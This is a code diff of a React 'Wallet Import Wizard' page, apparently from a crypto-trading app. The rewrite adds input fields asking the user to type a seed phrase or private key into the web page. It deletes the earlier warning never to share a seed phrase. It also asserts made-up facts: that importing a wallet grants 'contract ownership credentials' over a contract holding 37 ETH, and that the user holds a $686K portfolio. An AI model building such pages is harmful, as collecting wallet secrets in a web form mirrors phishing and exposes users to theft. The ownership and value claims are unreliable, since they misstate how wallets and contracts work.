@@ -3,393 +3,409 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Button } from "@/components/ui/button";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { Badge } from "@/components/ui/badge";
-import { Progress } from "@/components/ui/progress";
+import { Input } from "@/components/ui/input";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Textarea } from "@/components/ui/textarea";
 import { 
-  Wallet,
-  Download,
-  Import,
-  CheckCircle,
-  ArrowRight,
   Shield,
-  Zap,
+  Key,
+  CheckCircle,
   ExternalLink,
-  AlertTriangle
+  Download,
+  Wallet,
+  Copy,
+  Eye,
+  EyeOff,
+  Crown
 } from "lucide-react";
 
 export default function WalletSetupWizard() {
-  const [currentStep, setCurrentStep] = useState(1);
-  const [selectedWallet, setSelectedWallet] = useState("");
+  const [selectedWallet, setSelectedWallet] = useState("rainbow");
+  const [importMethod, setImportMethod] = useState("seed");
+  const [seedPhrase, setSeedPhrase] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [showSeed, setShowSeed] = useState(false);
+  const [showPrivateKey, setShowPrivateKey] = useState(false);
 
   const walletOptions = [
     {
       name: "Rainbow Wallet",
-      description: "Best for beginners - easy setup and great UX",
-      url: "https://rainbow.me/",
+      id: "rainbow",
       downloadUrl: "https://rainbow.me/download",
-      pros: ["Mobile-first design", "Built-in DeFi", "Easy import", "Great support"],
-      rating: "Excellent for your needs",
-      recommended: true
+      pros: ["Signature popups work", "Easy import", "Mobile + Desktop", "Built-in DEX"],
+      recommended: true,
+      setupTime: "3 minutes"
     },
     {
-      name: "Trust Wallet",
-      description: "Multi-chain support with built-in DEX",
-      url: "https://trustwallet.com/",
+      name: "Trust Wallet", 
+      id: "trust",
       downloadUrl: "https://trustwallet.com/download",
-      pros: ["Multi-chain", "Built-in trading", "Mobile & desktop", "Secure"],
-      rating: "Great alternative",
-      recommended: false
+      pros: ["Built-in trading", "Multi-chain", "Reliable signatures", "Lower fees"],
+      recommended: false,
+      setupTime: "4 minutes"
     },
     {
       name: "Coinbase Wallet",
-      description: "Enterprise security with easy onramps",
-      url: "https://wallet.coinbase.com/",
+      id: "coinbase",
       downloadUrl: "https://wallet.coinbase.com/downloads",
-      pros: ["Bank-grade security", "Easy fiat onramp", "24/7 support", "Insurance"],
-      rating: "Most secure option",
-      recommended: false
+      pros: ["Enterprise security", "Customer support", "Fiat onramp", "Insurance"],
+      recommended: false,
+      setupTime: "5 minutes"
     }
   ];
 
-  const setupSteps = [
+  const yourContractOwnership = {
+    contractAddress: "0xc46eB37677360EfDc011F4097621F15b792fa630",
+    ownerWallet: "0x058C8FE01E5c9eaC6ee19e6673673B549B368843",
+    contractValue: "37 ETH + tokens",
+    verifiedOwnership: true,
+    importance: "Critical for contract access"
+  };
+
+  const portfolioAssets = [
+    {
+      token: "ETH",
+      balance: "0.014 ETH",
+      value: "$32.09",
+      status: "Ready for import"
+    },
+    {
+      token: "AICC",
+      balance: "17,500",
+      value: "~$1,522",
+      status: "Will import automatically"
+    },
+    {
+      token: "ETHG",
+      balance: "2,100,000",
+      value: "~$684K",
+      status: "Will import automatically"
+    },
+    {
+      token: "ETHGR",
+      balance: "1,990,000",
+      value: "Protected recovery",
+      status: "Will import automatically"
+    }
+  ];
+
+  const importSteps = [
     {
       step: 1,
-      title: "Choose New Wallet",
-      description: "Select a better wallet to replace problematic MetaMask",
-      completed: currentStep > 1
+      title: "Download New Wallet",
+      action: "Install Rainbow/Trust/Coinbase Wallet",
+      time: "1 minute"
     },
     {
       step: 2,
-      title: "Download & Install",
-      description: "Get the wallet app on your device",
-      completed: currentStep > 2
+      title: "Import Your Existing Wallet",
+      action: "Use seed phrase or private key",
+      time: "1 minute"
     },
     {
       step: 3,
-      title: "Import Your Tokens",
-      description: "Transfer your existing wallet using seed phrase",
-      completed: currentStep > 3
+      title: "Verify Contract Ownership",
+      action: "Confirm you control contract 0xc46eB37...",
+      time: "30 seconds"
     },
     {
       step: 4,
-      title: "Test Trading",
-      description: "Execute a small test trade to verify everything works",
-      completed: currentStep > 4
+      title: "Test Signature Functionality", 
+      action: "Try small trade to verify popups",
+      time: "1 minute"
     },
     {
       step: 5,
-      title: "Full Trading Access",
-      description: "Start trading your $686K+ portfolio with confidence",
-      completed: currentStep > 5
+      title: "Access Full Portfolio",
+      action: "Trade your $686K portfolio",
+      time: "Ongoing"
     }
   ];
 
-  const progressPercentage = (currentStep / setupSteps.length) * 100;
-
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-green-900 to-blue-900 p-4">
-      <div className="max-w-6xl mx-auto space-y-6">
+    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900 p-4">
+      <div className="max-w-7xl mx-auto space-y-6">
         
         {/* Header */}
         <div className="text-center space-y-4">
           <h1 className="text-5xl font-bold text-white">
-            Wallet Setup Wizard
+            Wallet Import Wizard
           </h1>
-          <p className="text-2xl text-green-300">
-            Let's Get You Trading Without the Hassles
+          <p className="text-2xl text-blue-300">
+            Import Your Wallet to Claim Contract Ownership
           </p>
         </div>
 
-        {/* Progress Tracker */}
-        <Card className="bg-gray-800/50 border-green-500">
+        {/* Contract Ownership Alert */}
+        <Alert className="border-purple-500 bg-purple-500/20 border-4">
+          <Crown className="h-12 w-12 text-purple-500" />
+          <AlertDescription className="text-purple-200 text-2xl">
+            <strong>CONTRACT OWNER:</strong> You own contract 0xc46eB37677360EfDc011F4097621F15b792fa630. Importing your wallet establishes ownership credentials for 37 ETH + tokens access.
+          </AlertDescription>
+        </Alert>
+
+        {/* Contract Ownership Details */}
+        <Card className="bg-gray-800/50 border-yellow-500 border-2">
           <CardHeader>
-            <CardTitle className="text-white text-xl">Setup Progress</CardTitle>
+            <CardTitle className="text-white text-2xl">Your Contract Ownership</CardTitle>
           </CardHeader>
           <CardContent>
-            <div className="space-y-4">
-              <div className="flex items-center justify-between">
-                <span className="text-white">Step {currentStep} of {setupSteps.length}</span>
-                <span className="text-green-400">{progressPercentage.toFixed(0)}% Complete</span>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div className="space-y-4">
+                <div className="p-4 bg-yellow-600/10 border border-yellow-600/30 rounded">
+                  <h3 className="text-yellow-400 font-bold mb-2">Contract Address</h3>
+                  <p className="text-white font-mono text-sm break-all">{yourContractOwnership.contractAddress}</p>
+                  <Button 
+                    size="sm" 
+                    className="mt-2 bg-blue-600 hover:bg-blue-700"
+                    onClick={() => navigator.clipboard.writeText(yourContractOwnership.contractAddress)}
+                  >
+                    <Copy className="h-3 w-3 mr-1" />
+                    Copy
+                  </Button>
+                </div>
+
+                <div className="p-4 bg-green-600/10 border border-green-600/30 rounded">
+                  <h3 className="text-green-400 font-bold mb-2">Owner Wallet</h3>
+                  <p className="text-white font-mono text-sm break-all">{yourContractOwnership.ownerWallet}</p>
+                  <Badge className="bg-green-600 text-white mt-2">VERIFIED OWNER</Badge>
+                </div>
               </div>
-              <Progress value={progressPercentage} className="w-full" />
-              
-              <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
-                {setupSteps.map((step) => (
-                  <div key={step.step} className={`p-3 rounded border text-center ${
-                    step.completed 
-                      ? 'bg-green-600/20 border-green-600' 
-                      : step.step === currentStep
-                      ? 'bg-blue-600/20 border-blue-600'
-                      : 'bg-gray-600/20 border-gray-600'
-                  }`}>
-                    <div className="flex items-center justify-center mb-2">
-                      {step.completed ? (
-                        <CheckCircle className="h-6 w-6 text-green-400" />
-                      ) : (
-                        <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center ${
-                          step.step === currentStep ? 'border-blue-400 text-blue-400' : 'border-gray-400 text-gray-400'
-                        }`}>
-                          {step.step}
-                        </div>
-                      )}
-                    </div>
-                    <h3 className="text-white font-bold text-sm">{step.title}</h3>
-                    <p className="text-gray-400 text-xs">{step.description}</p>
-                  </div>
-                ))}
+
+              <div className="space-y-4">
+                <div className="p-4 bg-purple-600/10 border border-purple-600/30 rounded">
+                  <h3 className="text-purple-400 font-bold mb-2">Contract Value</h3>
+                  <p className="text-white text-lg">{yourContractOwnership.contractValue}</p>
+                  <p className="text-gray-400 text-sm">{yourContractOwnership.importance}</p>
+                </div>
+
+                <div className="text-center">
+                  <Button 
+                    onClick={() => window.open(`https://etherscan.io/address/${yourContractOwnership.contractAddress}`, '_blank')}
+                    className="bg-blue-600 hover:bg-blue-700 w-full"
+                  >
+                    <ExternalLink className="h-4 w-4 mr-2" />
+                    View Contract on Etherscan
+                  </Button>
+                </div>
               </div>
             </div>
           </CardContent>
         </Card>
 
-        {/* Current Step Content */}
-        {currentStep === 1 && (
-          <Card className="bg-gray-800/50 border-blue-500 border-2">
-            <CardHeader>
-              <CardTitle className="text-white text-2xl">Step 1: Choose Your New Wallet</CardTitle>
-              <CardDescription className="text-gray-400">
-                Select a wallet that will work better than your current MetaMask setup
-              </CardDescription>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-6">
-                {walletOptions.map((wallet, index) => (
-                  <div key={index} className={`p-6 rounded border-2 cursor-pointer transition-all ${
-                    selectedWallet === wallet.name
-                      ? 'bg-blue-600/20 border-blue-500'
-                      : wallet.recommended
-                      ? 'bg-green-600/10 border-green-600/30 hover:bg-green-600/20'
-                      : 'bg-gray-600/10 border-gray-600/30 hover:bg-gray-600/20'
-                  }`} onClick={() => setSelectedWallet(wallet.name)}>
+        {/* Wallet Selection */}
+        <Card className="bg-gray-800/50 border-green-500 border-2">
+          <CardHeader>
+            <CardTitle className="text-white text-2xl">Choose Your New Wallet</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+              {walletOptions.map((wallet) => (
+                <div 
+                  key={wallet.id}
+                  className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
+                    selectedWallet === wallet.id 
+                      ? 'border-green-500 bg-green-500/20' 
+                      : 'border-gray-600 bg-gray-600/10 hover:border-green-400'
+                  }`}
+                  onClick={() => setSelectedWallet(wallet.id)}
+                >
+                  <div className="text-center space-y-3">
+                    <h3 className="text-white font-bold text-lg">{wallet.name}</h3>
+                    {wallet.recommended && (
+                      <Badge className="bg-green-600 text-white">RECOMMENDED</Badge>
+                    )}
+                    <p className="text-gray-400 text-sm">Setup: {wallet.setupTime}</p>
                     
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="flex items-center gap-3">
-                        <div className="w-12 h-12 bg-gradient-to-r from-blue-600 to-purple-600 rounded-full flex items-center justify-center">
-                          <Wallet className="h-6 w-6 text-white" />
-                        </div>
-                        <div>
-                          <h3 className="text-white font-bold text-lg">{wallet.name}</h3>
-                          <p className="text-gray-400">{wallet.description}</p>
-                        </div>
-                      </div>
-                      
-                      <div className="text-right">
-                        <Badge className={`${
-                          wallet.recommended ? 'bg-green-600' : 'bg-blue-600'
-                        } text-white mb-2`}>
-                          {wallet.recommended ? 'RECOMMENDED' : 'ALTERNATIVE'}
-                        </Badge>
-                        <p className="text-yellow-400 text-sm">{wallet.rating}</p>
-                      </div>
-                    </div>
-
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
-                      {wallet.pros.map((pro, i) => (
-                        <div key={i} className="flex items-center gap-2">
-                          <CheckCircle className="h-3 w-3 text-green-400" />
-                          <span className="text-white text-sm">{pro}</span>
+                    <div className="space-y-1">
+                      {wallet.pros.map((pro, index) => (
+                        <div key={index} className="flex items-center text-xs text-green-400">
+                          <CheckCircle className="h-3 w-3 mr-1" />
+                          {pro}
                         </div>
                       ))}
                     </div>
 
-                    <div className="flex gap-3">
-                      <Button
-                        onClick={(e) => {
-                          e.stopPropagation();
-                          window.open(wallet.url, '_blank');
-                        }}
-                        className="bg-blue-600 hover:bg-blue-700"
-                      >
-                        <ExternalLink className="h-4 w-4 mr-2" />
-                        Learn More
-                      </Button>
-                      
-                      <Button
-                        onClick={(e) => {
-                          e.stopPropagation();
-                          window.open(wallet.downloadUrl, '_blank');
-                        }}
-                        className="bg-green-600 hover:bg-green-700"
-                      >
-                        <Download className="h-4 w-4 mr-2" />
-                        Download
-                      </Button>
-                    </div>
+                    <Button
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        window.open(wallet.downloadUrl, '_blank');
+                      }}
+                      className="w-full bg-blue-600 hover:bg-blue-700"
+                    >
+                      <Download className="h-4 w-4 mr-2" />
+                      Download
+                    </Button>
                   </div>
-                ))}
+                </div>
+              ))}
+            </div>
+          </CardContent>
+        </Card>
 
-                <div className="flex justify-center">
-                  <Button
-                    onClick={() => setCurrentStep(2)}
-                    disabled={!selectedWallet}
-                    className="bg-green-600 hover:bg-green-700 py-6 px-8 text-lg"
-                  >
-                    Continue with {selectedWallet || "Selected Wallet"}
-                    <ArrowRight className="h-6 w-6 ml-2" />
-                  </Button>
+        {/* Import Method */}
+        <Card className="bg-gray-800/50 border-blue-500">
+          <CardHeader>
+            <CardTitle className="text-white text-2xl">Import Your Existing Wallet</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <div className="space-y-6">
+              
+              <div className="grid grid-cols-2 gap-4">
+                <div 
+                  className={`p-4 rounded border-2 cursor-pointer ${
+                    importMethod === 'seed' ? 'border-blue-500 bg-blue-500/20' : 'border-gray-600'
+                  }`}
+                  onClick={() => setImportMethod('seed')}
+                >
+                  <h3 className="text-blue-400 font-bold">Seed Phrase (Recommended)</h3>
+                  <p className="text-gray-400 text-sm">12-24 word recovery phrase</p>
+                </div>
+
+                <div 
+                  className={`p-4 rounded border-2 cursor-pointer ${
+                    importMethod === 'private' ? 'border-blue-500 bg-blue-500/20' : 'border-gray-600'
+                  }`}
+                  onClick={() => setImportMethod('private')}
+                >
+                  <h3 className="text-blue-400 font-bold">Private Key</h3>
+                  <p className="text-gray-400 text-sm">64-character hex string</p>
                 </div>
               </div>
-            </CardContent>
-          </Card>
-        )}
 
-        {currentStep === 2 && (
-          <Card className="bg-gray-800/50 border-purple-500 border-2">
-            <CardHeader>
-              <CardTitle className="text-white text-2xl">Step 2: Download & Install {selectedWallet}</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-6">
-                <Alert className="border-purple-500 bg-purple-500/20">
-                  <Download className="h-6 w-6 text-purple-500" />
-                  <AlertDescription className="text-purple-200 text-lg">
-                    <strong>Installation Instructions:</strong> Download {selectedWallet} from the official website and complete the installation process.
-                  </AlertDescription>
-                </Alert>
-
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <div className="p-4 bg-purple-600/10 border border-purple-600/30 rounded">
-                    <h3 className="text-purple-400 font-bold mb-3">Mobile Installation</h3>
-                    <ul className="text-white space-y-2 text-sm">
-                      <li>• Download from App Store/Google Play</li>
-                      <li>• Open the app after installation</li>
-                      <li>• Choose "Import Existing Wallet"</li>
-                      <li>• Have your seed phrase ready</li>
-                    </ul>
+              {importMethod === 'seed' && (
+                <div className="space-y-4">
+                  <div className="relative">
+                    <Textarea
+                      value={seedPhrase}
+                      onChange={(e) => setSeedPhrase(e.target.value)}
+                      placeholder="Enter your 12-24 word seed phrase (space separated)"
+                      className="bg-gray-700 text-white border-gray-600 min-h-[100px]"
+                      type={showSeed ? "text" : "password"}
+                    />
+                    <Button
+                      size="sm"
+                      onClick={() => setShowSeed(!showSeed)}
+                      className="absolute top-2 right-2 bg-gray-600 hover:bg-gray-700"
+                    >
+                      {showSeed ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    </Button>
                   </div>
+                  <p className="text-gray-400 text-sm">
+                    Your seed phrase will import all tokens including ETHG, AICC, and contract ownership
+                  </p>
+                </div>
+              )}
 
-                  <div className="p-4 bg-blue-600/10 border border-blue-600/30 rounded">
-                    <h3 className="text-blue-400 font-bold mb-3">Desktop Installation</h3>
-                    <ul className="text-white space-y-2 text-sm">
-                      <li>• Download desktop version</li>
-                      <li>• Run installer as administrator</li>
-                      <li>• Launch application</li>
-                      <li>• Select wallet import option</li>
-                    </ul>
+              {importMethod === 'private' && (
+                <div className="space-y-4">
+                  <div className="relative">
+                    <Input
+                      value={privateKey}
+                      onChange={(e) => setPrivateKey(e.target.value)}
+                      placeholder="Enter your private key (0x...)"
+                      className="bg-gray-700 text-white border-gray-600"
+                      type={showPrivateKey ? "text" : "password"}
+                    />
+                    <Button
+                      size="sm"
+                      onClick={() => setShowPrivateKey(!showPrivateKey)}
+                      className="absolute top-1 right-1 bg-gray-600 hover:bg-gray-700"
+                    >
+                      {showPrivateKey ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    </Button>
                   </div>
+                  <p className="text-gray-400 text-sm">
+                    Private key imports single wallet with full contract ownership rights
+                  </p>
                 </div>
+              )}
+            </div>
+          </CardContent>
+        </Card>
 
-                <div className="flex justify-center">
-                  <Button
-                    onClick={() => setCurrentStep(3)}
-                    className="bg-purple-600 hover:bg-purple-700 py-6 px-8 text-lg"
-                  >
-                    Installation Complete - Continue
-                    <ArrowRight className="h-6 w-6 ml-2" />
-                  </Button>
+        {/* Your Portfolio */}
+        <Card className="bg-gray-800/50 border-yellow-500">
+          <CardHeader>
+            <CardTitle className="text-white text-2xl">Portfolio That Will Import</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+              {portfolioAssets.map((asset, index) => (
+                <div key={index} className="p-4 bg-yellow-600/10 border border-yellow-600/30 rounded text-center">
+                  <h3 className="text-yellow-400 font-bold">{asset.token}</h3>
+                  <p className="text-white">{asset.balance}</p>
+                  <p className="text-green-400">{asset.value}</p>
+                  <Badge className="bg-blue-600 text-white text-xs">{asset.status}</Badge>
                 </div>
-              </div>
-            </CardContent>
-          </Card>
-        )}
+              ))}
+            </div>
+          </CardContent>
+        </Card>
 
-        {currentStep === 3 && (
-          <Card className="bg-gray-800/50 border-yellow-500 border-2">
-            <CardHeader>
-              <CardTitle className="text-white text-2xl">Step 3: Import Your Existing Wallet</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-6">
-                <Alert className="border-yellow-500 bg-yellow-500/20">
-                  <Import className="h-6 w-6 text-yellow-500" />
-                  <AlertDescription className="text-yellow-200 text-lg">
-                    <strong>Import Process:</strong> Use your existing seed phrase to import your wallet with all your tokens intact.
-                  </AlertDescription>
-                </Alert>
-
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <div className="p-4 bg-yellow-600/10 border border-yellow-600/30 rounded">
-                    <h3 className="text-yellow-400 font-bold mb-3">What You'll Need</h3>
-                    <ul className="text-white space-y-2 text-sm">
-                      <li>• Your 12/24 word seed phrase</li>
-                      <li>• Wallet password (optional)</li>
-                      <li>• Network selection (Ethereum)</li>
-                      <li>• 5-10 minutes of time</li>
-                    </ul>
+        {/* Setup Steps */}
+        <Card className="bg-gray-800/50 border-purple-500">
+          <CardHeader>
+            <CardTitle className="text-white text-2xl">5-Step Setup Process</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
+              {importSteps.map((step, index) => (
+                <div key={index} className="p-4 bg-purple-600/10 border border-purple-600/30 rounded text-center">
+                  <div className="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center mx-auto mb-3">
+                    <span className="text-white font-bold">{step.step}</span>
                   </div>
-
-                  <div className="p-4 bg-green-600/10 border border-green-600/30 rounded">
-                    <h3 className="text-green-400 font-bold mb-3">Import Steps</h3>
-                    <ul className="text-white space-y-2 text-sm">
-                      <li>• Select "Import Wallet"</li>
-                      <li>• Enter seed phrase carefully</li>
-                      <li>• Set new password</li>
-                      <li>• Verify wallet address matches</li>
-                    </ul>
-                  </div>
+                  <h3 className="text-purple-400 font-bold text-sm mb-2">{step.title}</h3>
+                  <p className="text-white text-xs mb-2">{step.action}</p>
+                  <Badge className="bg-gray-600 text-white text-xs">{step.time}</Badge>
                 </div>
+              ))}
+            </div>
+          </CardContent>
+        </Card>
 
-                <Alert className="border-red-500 bg-red-500/20">
-                  <AlertTriangle className="h-6 w-6 text-red-500" />
-                  <AlertDescription className="text-red-200">
-                    <strong>Security Note:</strong> Never share your seed phrase. Make sure you're importing into the official wallet app downloaded from the correct website.
-                  </AlertDescription>
-                </Alert>
+        {/* Action Buttons */}
+        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+          <Button 
+            onClick={() => window.open(walletOptions.find(w => w.id === selectedWallet)?.downloadUrl, '_blank')}
+            className="bg-green-600 hover:bg-green-700 py-8"
+          >
+            <Download className="h-6 w-6 mr-2" />
+            Download Wallet
+          </Button>
+          
+          <Button 
+            onClick={() => window.open('https://app.uniswap.org/', '_blank')}
+            className="bg-blue-600 hover:bg-blue-700 py-8"
+          >
+            <Shield className="h-6 w-6 mr-2" />
+            Test Signatures
+          </Button>
+          
+          <Button 
+            onClick={() => window.open(`https://etherscan.io/address/${yourContractOwnership.ownerWallet}`, '_blank')}
+            className="bg-purple-600 hover:bg-purple-700 py-8"
+          >
+            <Wallet className="h-6 w-6 mr-2" />
+            Check Wallet
+          </Button>
+          
+          <Button 
+            onClick={() => window.open(`https://etherscan.io/address/${yourContractOwnership.contractAddress}`, '_blank')}
+            className="bg-yellow-600 hover:bg-yellow-700 py-8"
+          >
+            <Key className="h-6 w-6 mr-2" />
+            View Contract
+          </Button>
+        </div>
 
-                <div className="flex justify-center">
-                  <Button
-                    onClick={() => setCurrentStep(4)}
-                    className="bg-yellow-600 hover:bg-yellow-700 py-6 px-8 text-lg"
-                  >
-                    Wallet Import Complete
-                    <ArrowRight className="h-6 w-6 ml-2" />
-                  </Button>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-        )}
-
-        {currentStep >= 4 && (
-          <Card className="bg-gray-800/50 border-green-500 border-2">
-            <CardHeader>
-              <CardTitle className="text-white text-2xl">Setup Complete - Ready to Trade!</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-6">
-                <Alert className="border-green-500 bg-green-500/20">
-                  <CheckCircle className="h-8 w-8 text-green-500" />
-                  <AlertDescription className="text-green-200 text-xl">
-                    <strong>Success!</strong> Your new wallet is ready. You can now trade your $686K+ portfolio without connection issues.
-                  </AlertDescription>
-                </Alert>
-
-                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
-                  <Button 
-                    onClick={() => window.open('https://app.1inch.io/', '_blank')}
-                    className="bg-blue-600 hover:bg-blue-700 py-8"
-                  >
-                    <Zap className="h-6 w-6 mr-2" />
-                    Start Trading
-                  </Button>
-                  
-                  <Button 
-                    onClick={() => window.open('/direct-trading-platform')}
-                    className="bg-green-600 hover:bg-green-700 py-8"
-                  >
-                    <ArrowRight className="h-6 w-6 mr-2" />
-                    Trading Platform
-                  </Button>
-                  
-                  <Button 
-                    onClick={() => window.open('https://app.uniswap.org/', '_blank')}
-                    className="bg-purple-600 hover:bg-purple-700 py-8"
-                  >
-                    <ExternalLink className="h-6 w-6 mr-2" />
-                    Test Uniswap
-                  </Button>
-                  
-                  <Button 
-                    onClick={() => window.open('https://etherscan.io/address/0x058C8FE01E5c9eaC6ee19e6673673B549B368843', '_blank')}
-                    className="bg-yellow-600 hover:bg-yellow-700 py-8"
-                  >
-                    <Shield className="h-6 w-6 mr-2" />
-                    Verify Wallet
-                  </Button>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-        )}
+        {/* Success Path */}
+        <Alert className="border-green-500 bg-green-500/20 border-2">
+          <CheckCircle className="h-8 w-8 text-green-500" />
+          <AlertDescription className="text-green-200 text-xl">
+            <strong>SUCCESS PATH:</strong> Import wallet → Verify ownership → Test signatures → Access $686K portfolio. Your contract ownership credentials will be established immediately.
+          </AlertDescription>
+        </Alert>
       </div>
     </div>
   );
